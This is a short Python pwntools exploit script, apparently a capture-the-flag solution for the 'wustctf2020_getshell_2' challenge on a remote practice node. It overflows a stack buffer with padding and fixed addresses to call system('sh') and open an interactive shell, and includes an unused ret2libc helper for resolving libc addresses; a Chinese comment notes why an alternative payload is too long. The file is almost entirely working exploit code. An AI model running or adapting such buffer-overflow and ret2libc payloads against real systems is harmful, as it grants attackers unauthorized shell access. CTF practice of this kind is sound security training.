from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)


context(os='linux', arch='i386', log_level='debug')
binary = './wustctf2020_getshell_2'

context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',25573) if argv[1]=='r' else process(binary)


system_plt = elf.plt['system']
system_call = 0x08048529
sh_addr = 0x08048670
main_addr = 0x08048582

# payload = b'a'* (0x18+4) + p32(system_plt) + p32(main_addr) + p32(sh_addr)
# 因为读入长度为36，上面这个payload刚好超了4字节
payload = b'a'* (0x18+4) + p32(system_call) + p32(sh_addr)
io.sendline(payload)
io.interactive()

